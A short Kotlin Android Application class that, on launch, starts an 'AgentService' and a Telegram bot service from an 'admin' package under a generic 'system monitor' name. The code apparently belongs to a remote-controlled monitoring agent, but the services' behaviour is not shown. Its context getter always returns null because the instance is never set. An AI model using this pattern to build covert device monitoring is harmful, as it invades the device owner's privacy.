package com.system.monitor

import android.app.Application
import android.content.Context
import android.content.Intent
import com.system.monitor.admin.TelegramBotService
import com.system.monitor.CrashHandler

class AgentApplication : Application() {

    override fun onCreate() {
        super.onCreate()
        CrashHandler.init(this)
        startService(Intent(this, AgentService::class.java))
        // Start Telegram bot
        TelegramBotService(this).start()
    }

    companion object {
        @JvmStatic
        fun getContext(): Context? = instance
        private var instance: Context? = null
            @Suppress("UNUSED_PROPERTY")
            set(value) { field = value }
    }
}